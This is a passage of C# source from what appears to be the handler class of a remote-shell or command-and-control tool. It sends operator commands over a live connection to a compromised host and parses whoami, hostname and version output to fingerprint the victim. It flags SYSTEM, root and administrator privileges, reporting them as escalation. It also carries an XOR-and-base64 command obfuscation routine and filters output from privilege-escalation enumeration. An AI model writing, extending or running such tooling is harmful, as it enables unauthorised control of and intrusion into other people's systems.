                        RaiseResponseReceived($"[*] SYSTEM account identified", Color.Red);
                    }
                    else
                    {
                        _userName = trimmed;

                        string rightPart = parts[1];


                        if (_isDomainJoined)
                        {
                            RaiseResponseReceived($"[*] Domain user: {rightPart} (Domain: {_domainName})", Color.Green);
                        }
                        else
                        {
                            RaiseResponseReceived($"[*] Local user: {rightPart} (Computer: {_computerName})", Color.Cyan);
                        }
                    }
                    return;
                }
            }
        }
    }
    private void ParseWindowsHostname(string response)
    {
        if (string.IsNullOrEmpty(response)) return;

        var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        foreach (var line in lines)
        {
            var trimmed = line.Trim();
            // Skip command echoes and prompts
            if (trimmed == "hostname" || trimmed.StartsWith("PS ") || trimmed.Contains("C:\\") || trimmed.Length == 0)
                continue;

            // Valid hostname
            if (!trimmed.Contains(" ") &&
                trimmed.Length > 0 &&
                trimmed.Length < 64 &&
                !trimmed.Contains("not recognized"))
            {
                if (_computerName != trimmed.ToUpper())
                {
                    _computerName = trimmed.ToUpper();
                    RaiseResponseReceived($"[*] Hostname identified: {_computerName}", Color.Cyan);
                }
                return;
            }
        }
    }
    private void ParseWindowsVersion(string response)
    {
        if (string.IsNullOrEmpty(response)) return;

        var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        foreach (var line in lines)
        {
            var trimmed = line.Trim();
            // Skip command echoes and prompts
            if (trimmed == "ver" || trimmed.StartsWith("PS ") || trimmed.Contains("C:\\") || trimmed.Length == 0)
                continue;

            // Look for Microsoft Windows version string
            var match = Regex.Match(trimmed, @"Microsoft Windows \[Version ([^\]]+)\]");
            if (match.Success)
            {
                _osVersion = $"Windows {match.Groups[1].Value}";
                RaiseResponseReceived($"[*] OS identified: {_osVersion}", Color.Cyan);
                return;
            }
            else if (trimmed.Contains("Microsoft Windows"))
            {
                _osVersion = "Windows";
                RaiseResponseReceived($"[*] OS identified: {_osVersion}", Color.Cyan);
                return;
            }
        }
    }

    private void ParseLinuxUsername(string response)
    {
        if (string.IsNullOrEmpty(response)) return;

        var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        foreach (var line in lines)
        {
            var trimmed = line.Trim();

            // Skip command echoes, prompts, and common command names
            if (trimmed == "whoami" ||
                trimmed == "hostname" ||
                trimmed == "id" ||
                trimmed == "uname" ||
                trimmed.Contains("$") ||
                trimmed.Contains("@") ||
                trimmed.Length == 0 ||
                trimmed.Contains("#") ||
                trimmed.StartsWith("root@") ||
                trimmed.EndsWith("#") ||
                trimmed.Contains(":"))
                continue;

            // Valid username: single word, reasonable length, no special chars typical of command output
            if (!trimmed.Contains(" ") &&
                trimmed.Length > 0 &&
                trimmed.Length < 32 &&
                !trimmed.Contains("command") &&
                !trimmed.Contains("not found") &&
                !trimmed.Contains("/") &&
                !trimmed.Contains("=") &&
                Regex.IsMatch(trimmed, @"^[a-zA-Z0-9_-]+$"))
            {
                string[] commonCommands = { "whoami", "hostname", "pwd", "ls", "cat", "grep", "find", "ps", "top", "id", "uname" };
                if (commonCommands.Contains(trimmed.ToLower()))
                    continue;

                _userName = trimmed;
                RaiseResponseReceived($"[*] User identified: {_userName}", Color.Cyan);
                return;
            }
        }
    }
    private void ParseLinuxHostname(string response)
    {
        if (string.IsNullOrEmpty(response)) return;

        var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        foreach (var line in lines)
        {
            var trimmed = line.Trim();
            // Skip command echoes and prompts
            if (trimmed == "hostname" || trimmed.Contains("$") || trimmed.Contains("@") || trimmed.Length == 0)
                continue;

            // Valid hostname: single word, reasonable length
            if (!trimmed.Contains(" ") &&
                trimmed.Length > 0 &&
                trimmed.Length < 64 &&
                !trimmed.Contains("command") &&
                !trimmed.Contains("not found"))
            {
                _computerName = trimmed;
                RaiseResponseReceived($"[*] Hostname identified: {_computerName}", Color.Cyan);
                return;
            }
        }
    }

    private void ParseLinuxVersion(string response)
    {
        if (string.IsNullOrEmpty(response)) return;

        var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        foreach (var line in lines)
        {
            var trimmed = line.Trim();
            // Skip command echoes
            if (trimmed == "uname -r" || trimmed.Contains("$") || trimmed.Length == 0)
                continue;

            // Look for kernel version pattern
            if (Regex.IsMatch(trimmed, @"^\d+\.\d+\.\d+"))
            {
                _osVersion = $"Linux {trimmed}";
                RaiseResponseReceived($"[*] OS identified: {_osVersion}", Color.Cyan);
                return;
            }
        }
    }
    private void ParseLinuxPrivileges(string response)
    {
        if (string.IsNullOrEmpty(response)) return;

        var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        foreach (var line in lines)
        {
            var trimmed = line.Trim();
            if (trimmed == "0")
            {
                _isAdmin = true;
                if (_userName != "root")
                {
                    _userName = "root";
                }
                RaiseResponseReceived($"[*] Root privileges detected", Color.Red);
                return;
            }
        }
    }

    private void ParseLinuxDistro(string response)
    {
        if (string.IsNullOrEmpty(response)) return;

        // Look for PRETTY_NAME or NAME in os-release
        var match = Regex.Match(response, @"(?:PRETTY_)?NAME=""?([^""]+)""?", RegexOptions.IgnoreCase);
        if (match.Success)
        {
            string distro = match.Groups[1].Value.Trim();
            if (!string.IsNullOrEmpty(distro) && !distro.Contains("command"))
            {
                _osVersion = distro;
                RaiseResponseReceived($"[*] Distribution: {_osVersion}", Color.Cyan);
            }
        }
    }


    private string CleanShellPrompt(string message)
    {
        // Remove ANSI escape sequences for cleaner logging
        string cleaned = Regex.Replace(message, @"\x1B\[[0-9;]*[mGKH]", "");

        // Remove the ]0; terminal title sequences
        cleaned = Regex.Replace(cleaned, @"\]0;[^\a]*\a", "");

        return cleaned;
    }



    public void SendCommand(string command)
    {
        if (!_isConnected || _activeStream == null)
        {
            RaiseResponseReceived("[!] Client disconnected", Color.Red);
            return;
        }

        try
        {
            // Enhanced security: Only apply obfuscation for TLS connections with compatible clients
            string commandToSend = command;

            if (_isEncrypted && ShouldObfuscateCommand(command))
            {
                string timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ");
                commandToSend = $"{timestamp}|{command}";

                // Basic command obfuscation (simple XOR) - only for compatible clients
                commandToSend = ObfuscateCommand(commandToSend);
            }

            string trimmedCommand = command.Trim().ToLower();
            if (trimmedCommand == "whoami" || trimmedCommand == "id" || trimmedCommand == "hostname")
            {
                _allowGuiUpdates = true;
                RaiseResponseReceived("[*] Checking current user context...", Color.Yellow);

                // Set timeout to reset flag
                Task.Run(async () =>
                {
                    await Task.Delay(5000);
                    _allowGuiUpdates = false;
                });
            }
            else
            {
                _allowGuiUpdates = false;
            }

            if (command.StartsWith("powershell", StringComparison.OrdinalIgnoreCase))
            {
                string escapedCommand = command.Replace("\"", "\\\"");
                command = $"cmd.exe /c \"{escapedCommand}\"";
            }

            byte[] buffer = Encoding.UTF8.GetBytes(commandToSend + "\n");

            if (_activeStream.CanWrite)
            {
                _activeStream.Write(buffer, 0, buffer.Length);
                _activeStream.Flush();
            }
            else
            {
                RaiseResponseReceived("[!] Connection stream is not writable", Color.Red);
                Disconnect();
            }
        }
        catch (ObjectDisposedException)
        {
            RaiseResponseReceived($"[!] Connection has been closed", Color.Red);
            Disconnect();
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error sending command: {ex.Message}", Color.Red);
            Disconnect();
        }
    }
    private bool ShouldObfuscateCommand(string command)
    {
        return false;


    }
    private string ObfuscateCommand(string command)
    {
        try
        {
            byte[] data = Encoding.UTF8.GetBytes(command);
            byte key = (byte)(DateTime.Now.Millisecond % 255);

            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key;
            }

            return $"OBF|{key}|{Convert.ToBase64String(data)}";
        }
        catch
        {
            return command; // Fallback to original if obfuscation fails
        }
    }

    private string DeobfuscateCommand(string obfuscatedCommand)
    {
        try
        {
            if (!obfuscatedCommand.StartsWith("OBF|"))
                return obfuscatedCommand;

            var parts = obfuscatedCommand.Split('|', 3);
            if (parts.Length != 3)
                return obfuscatedCommand;

            byte key = byte.Parse(parts[1]);
            byte[] data = Convert.FromBase64String(parts[2]);

            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key;
            }

            return Encoding.UTF8.GetString(data);
        }
        catch
        {
            return obfuscatedCommand; // Return original if deobfuscation fails
        }
    }

    public void Disconnect()
    {
        lock (_lockObject)
        {
            if (_isConnected)
            {
                _isConnected = false;

                try
                {
                    // Properly dispose of streams
                    if (_activeStream != null)
                    {
                        _activeStream.Close();
                        _activeStream.Dispose();
                        _activeStream = null;
                    }

                    if (_sslStream != null)
                    {
                        _sslStream.Close();
                        _sslStream.Dispose();
                        _sslStream = null;
                    }

                    if (_baseStream != null)
                    {
                        _baseStream.Close();
                        _baseStream.Dispose();
                        _baseStream = null;
                    }

                    if (_client != null)
                    {
                        _client.Close();
                        _client.Dispose();
                        _client = null;
                    }
                }
                catch (Exception ex)
                {

                }

                RaiseStatusChanged();
            }
        }
    }

    public string GetLastResponse()
    {
        return _lastResponse;
    }
    public void SendPowerShellCommand(string command)
    {
        if (!_isConnected || _activeStream == null)
        {
            RaiseResponseReceived("[!] Client disconnected", Color.Red);
            return;
        }

        if (_shellType == "powershell")
        {
            // Send command directly for PowerShell
            SendCommand(command);
        }
        else if (_shellType == "cmd" && !_isLinux)
        {
            // Wrap in PowerShell invocation for CMD
            SendCommand($"powershell.exe -NoProfile -Command \"{command}\"");
        }
        else
        {
            RaiseResponseReceived("[!] PowerShell commands not supported on Linux clients", Color.Red);
        }
    }

    private void ParseStructuredSystemInfo(string infoText)
    {
        try
        {
            var lines = infoText.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            bool infoUpdated = false;

            foreach (var line in lines)
            {
                var trimmedLine = line.Trim();

                if (trimmedLine.StartsWith("User: "))
                {
                    string newUser = trimmedLine.Substring(5).Trim();
                    if (_userName != newUser && !string.IsNullOrEmpty(newUser))
                    {
                        string oldUser = _userName;
                        _userName = newUser;
                        infoUpdated = true;

                        // Check for privilege indicators
                        bool isSystemAccount = newUser.ToLower().Contains("system") ||
                                             newUser.EndsWith("$");
                        bool isAdminAccount = newUser.ToLower().Contains("administrator");

                        if (isSystemAccount)
                        {
                            RaiseResponseReceived($"[*] SYSTEM user identified: {_userName}@{_computerName}", Color.Red);
                        }
                        else if (isAdminAccount)
                        {
                            RaiseResponseReceived($"[*] Admin user identified: {_userName}@{_computerName}", Color.Red);
                        }
                        else
                        {
                            RaiseResponseReceived($"[*] User identified: {_userName}@{_computerName}", Color.Cyan);
                        }
                    }
                }
                else if (trimmedLine.StartsWith("Computer: "))
                {
                    string newComputer = trimmedLine.Substring(9).Trim();
                    if (_computerName != newComputer && !string.IsNullOrEmpty(newComputer))
                    {
                        _computerName = newComputer;
                        infoUpdated = true;
                        RaiseResponseReceived($"[*] Computer identified: {_computerName}", Color.Cyan);
                    }
                }
                else if (trimmedLine.StartsWith("Domain: "))
                {
                    string domain = trimmedLine.Substring(7).Trim();

                    if (!string.IsNullOrEmpty(domain))
                    {
                        _domainName = domain.Trim();


                        // Key logic: Compare with computer name
                        if (_domainName.Equals(_computerName, StringComparison.OrdinalIgnoreCase) ||
                            _domainName.Equals("WORKGROUP", StringComparison.OrdinalIgnoreCase))
                        {
                            _isDomainJoined = false;
                            RaiseResponseReceived($"[*] 🏠 WORKGROUP: {_domainName}", Color.Yellow);
                        }
                        else
                        {
                            _isDomainJoined = true;
                            RaiseResponseReceived($"[*] 🌐 DOMAIN: {_domainName}", Color.Green);
                        }

                        infoUpdated = true;
                    }

                    RaiseResponseReceived($"[*] Domain: {domain}", Color.Cyan);
                }
                else if (trimmedLine.StartsWith("OS: "))
                {
                    string newOS = trimmedLine.Substring(3).Trim();
                    if (_osVersion != newOS && !string.IsNullOrEmpty(newOS))
                    {
                        infoUpdated = true;

                        _osVersion = ConvertToFriendlyOSName(newOS);
                        RaiseResponseReceived($"[*] OS identified: {_osVersion}", Color.Cyan);
                    }
                }
                else if (trimmedLine.StartsWith("Admin: "))
                {
                    string adminStr = trimmedLine.Substring(6).Trim();
                    bool newAdmin = adminStr.Equals("Yes", StringComparison.OrdinalIgnoreCase);
                    if (_isAdmin != newAdmin)
                    {
                        _isAdmin = newAdmin;
                        infoUpdated = true;

                        if (newAdmin)
                        {
                            RaiseResponseReceived($"[*] Administrator privileges detected", Color.Red);
                        }
                        else
                        {
                            RaiseResponseReceived($"[*] Standard user privileges", Color.Yellow);
                        }
                    }
                }
            }

            if (infoUpdated)
            {
                RaiseStatusChanged();
            }
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error parsing structured system info: {ex.Message}", Color.Red);
        }
    }
    private string ConvertToFriendlyOSName(string technicalName)
    {
        if (string.IsNullOrEmpty(technicalName))
            return "Unknown";

        // Handle Windows NT kernel versions
        if (technicalName.Contains("Microsoft Windows NT") || technicalName.Contains("Windows NT"))
        {
            // Extract build number for more precise detection
            var buildMatch = Regex.Match(technicalName, @"(\d+)\.(\d+)\.(\d+)");
            if (buildMatch.Success)
            {
                int major = int.Parse(buildMatch.Groups[1].Value);
                int minor = int.Parse(buildMatch.Groups[2].Value);
                int build = int.Parse(buildMatch.Groups[3].Value);

                if (major == 10 && minor == 0)
                {
                    return build switch
                    {
                        // Windows 11 builds
                        >= 22631 => "Windows 11 23H2",
                        >= 22621 => "Windows 11 22H2",
                        >= 22000 => "Windows 11",

                        // Windows 10/Server builds (ambiguous ones get generic names)
                        >= 20348 => "Windows Server 2022",
                        >= 19045 => "Windows 10 22H2",
                        >= 19044 => "Windows 10 21H2",
                        >= 19043 => "Windows 10 21H1",
                        >= 19042 => "Windows 10 20H2",
                        >= 19041 => "Windows 10 2004",
                        >= 18363 => "Windows 10 1909",
                        >= 18362 => "Windows 10 1903",
                        >= 17763 => "Windows Server 2019",
                        >= 17134 => "Windows Server 2016",
                        >= 16299 => "Windows 10 1709",
                        >= 15063 => "Windows 10 1703",
                        >= 14393 => "Windows 10 1607",
                        >= 10586 => "Windows 10 1511",
                        >= 10240 => "Windows 10 RTM",

                        _ => "Windows 10"
                    };
                }
            }
        }

        return technicalName.Replace("Microsoft ", "").Replace(" NT", "");
    }
    private void ParseSystemInfo(string infoText)
    {
        try
        {
            // Skip if empty or just whitespace
            if (string.IsNullOrWhiteSpace(infoText))
                return;

            if (!ShouldProcessAsSystemInfo(infoText))
                return;

            // Handle structured system info format (from TLS connections)
            if (infoText.Contains("System Information:") ||
                (infoText.Contains("User:") && infoText.Contains("Computer:") && infoText.Contains("OS:")))
            {
                ParseStructuredSystemInfo(infoText);
                return;
            }

            // Only allow updates during initial gathering or from whoami command for plain text
            if (!_allowGuiUpdates && !_isEncrypted)
                return;

            // Handle structured PowerShell system info (for plain text connections)
            if (infoText.Contains("=== SYSTEM INFO START ===") && infoText.Contains("=== SYSTEM INFO END ==="))
            {
                ParseStructuredSystemInfo(infoText);
                return;
            }

            if (IsLikelyWhoamiResponse(infoText))
            {
                var allLines = infoText.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

                foreach (var line in allLines)
                {
                    var trimmedLine = line.Trim();

                    // Handle domain\user format (whoami response) - ONLY if it looks like actual whoami
                    if (trimmedLine.Contains("\\") && !trimmedLine.Contains("Response from") &&
                        IsValidWhoamiFormat(trimmedLine))
                    {
                        var parts = trimmedLine.Split('\\');
                        if (parts.Length == 2)
                        {
                            var computerPart = parts[0];
                            var userPart = parts[1];

                            // Handle cases where computer name might be truncated
                            if (computerPart.Length > 3 && !computerPart.StartsWith("PS"))
                            {
                                if (computerPart.ToLower().StartsWith("esktop"))
                                {
                                    computerPart = "D" + computerPart;
                                }

                                bool userChanged = _userName != userPart;
                                bool computerChanged = _computerName != computerPart.ToUpper();
                                string oldUser = _userName;

                                if (userChanged || computerChanged)
                                {
                                    _computerName = computerPart.ToUpper();
                                    _userName = userPart;

                                    // Check for privilege changes
                                    bool isSystemAccount = userPart.ToLower().Contains("system") ||
                                                         userPart.ToLower() == "nt authority\\system";
                                    bool isAdminAccount = userPart.ToLower().Contains("administrator") ||
                                                        userPart.ToLower().Contains("admin");

                                    if (isSystemAccount)
                                    {
                                        _isAdmin = true;
                                        if (userChanged)
                                        {
                                            RaiseResponseReceived($"[*] User escalated to SYSTEM: {_userName}@{_computerName}", Color.Red);
                                        }
                                        else
                                        {
                                            RaiseResponseReceived($"[*] SYSTEM user identified: {_userName}@{_computerName}", Color.Red);
                                        }
                                    }
                                    else if (isAdminAccount)
                                    {
                                        _isAdmin = true;
                                        if (userChanged)
                                        {
                                            RaiseResponseReceived($"[*] User escalated to admin: {_userName}@{_computerName}", Color.Red);
                                        }
                                        else
                                        {
                                            RaiseResponseReceived($"[*] Admin user identified: {_userName}@{_computerName}", Color.Red);
                                        }
                                    }
                                    else
                                    {
                                        if (userChanged && !string.IsNullOrEmpty(oldUser) && oldUser != "Unknown")
                                        {
                                            RaiseResponseReceived($"[*] User switched from {oldUser} to: {_userName}@{_computerName}", Color.Cyan);
                                        }
                                        else
                                        {
                                            RaiseResponseReceived($"[*] User identified: {_userName}@{_computerName}", Color.Cyan);
                                        }
                                    }

                                    RaiseStatusChanged();
                                    break; // Stop processing after finding valid user info
                                }
                            }
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            // Silent error handling
        }
    }
    private bool ShouldProcessAsSystemInfo(string content)
    {
        // Don't process if it contains obvious command output patterns
        string[] commandOutputIndicators = {
        "ServiceName",
        "ModifiableFile",
        "ModifiableFilePermissions",
        "IdentityReference",
        "AbuseFunction",
        "CanRestart",
        "StartName",
        "Path                            :",
        "Check                           :",
        "more ",
        "type ",
        "cat ",
        "Get-",
        "Invoke-",
        "Find-",
        "ProcessName",
        "ProcessId",
        "CPU",
        "Memory",
        "Handles"
    };

        foreach (string indicator in commandOutputIndicators)
        {
            if (content.Contains(indicator))
                return false;
        }

        // Don't process multi-line structured output that's clearly command results
        if (content.Contains("\n") && content.Contains(" : ") &&
            (content.Contains("Name") || content.Contains("Path") || content.Contains("Function")))
        {
            return false;
        }

        // Only process if it looks like actual system info
        return content.Contains("whoami") ||
               content.Contains("hostname") ||
               content.Contains("systeminfo") ||
               content.Contains("=== SYSTEM INFO") ||
               content.Contains("System Information:");
    }

    private bool IsLikelyWhoamiResponse(string content)
    {
        // Must be short and contain domain\user pattern
        if (content.Length > 200) return false;

        var lines = content.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        if (lines.Length > 5) return false; // whoami responses are typically 1-2 lines

        // Should contain domain\user pattern
        return lines.Any(line => line.Contains("\\") && IsValidWhoamiFormat(line.Trim()));
    }

    private bool IsValidWhoamiFormat(string line)
    {
        // Should be in format: DOMAIN\USER or COMPUTER\USER
        if (!line.Contains("\\")) return false;

        var parts = line.Split('\\');
        if (parts.Length != 2) return false;

        string domain = parts[0].Trim();
        string user = parts[1].Trim();

        // Domain/computer part should be reasonable length and not contain special chars from command output
        if (domain.Length == 0 || domain.Length > 50 ||
            domain.Contains(":") || domain.Contains("=") || domain.Contains(" "))
            return false;

        // User part should be reasonable and not contain command output patterns  
        if (user.Length == 0 || user.Length > 50 ||
            user.Contains(":") || user.Contains("=") ||
            user.Contains("ModifiableFile") || user.Contains("ServiceName"))
            return false;

        return true;
    }

    private void ParseWindowsAdminStatus(string response)
    {
        if (string.IsNullOrEmpty(response)) return;

        var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        foreach (var line in lines)
        {
            var trimmed = line.Trim();
            // Skip command echoes and prompts
            if (trimmed.Contains("Security.Principal") || trimmed.StartsWith("PS ") || trimmed.Length == 0)
                continue;

            if (trimmed.Contains("True") || trimmed.Contains("ADMIN"))
            {
                _isAdmin = true;
                RaiseResponseReceived($"[*] Administrator privileges detected", Color.Green);
                return;
            }
            else if (trimmed.Contains("False") || trimmed.Contains("USER"))
            {
                _isAdmin = false;
                RaiseResponseReceived($"[*] Standard user privileges", Color.Yellow);
                return;
            }
        }
    }

    private void RaiseResponseReceived(string message, Color color)
    {
        // Filter out shell detection noise
        if (string.IsNullOrWhiteSpace(message))
            return;

        string trimmed = message.Trim();

        if (trimmed.Equals("FILE_EXISTS", StringComparison.OrdinalIgnoreCase) ||
            trimmed.Equals("$PSVersionTable", StringComparison.OrdinalIgnoreCase) ||
            (trimmed.Equals("cmd.exe", StringComparison.OrdinalIgnoreCase) && trimmed.Length == 7)) // Only filter standalone "cmd.exe"
        {
            return;
        }



        ResponseReceived?.Invoke(this, new OutputMessageEventArgs(message, color));
    }


    private void RaiseStatusChanged()
    {
        StatusChanged?.Invoke(this, EventArgs.Empty);
    }
}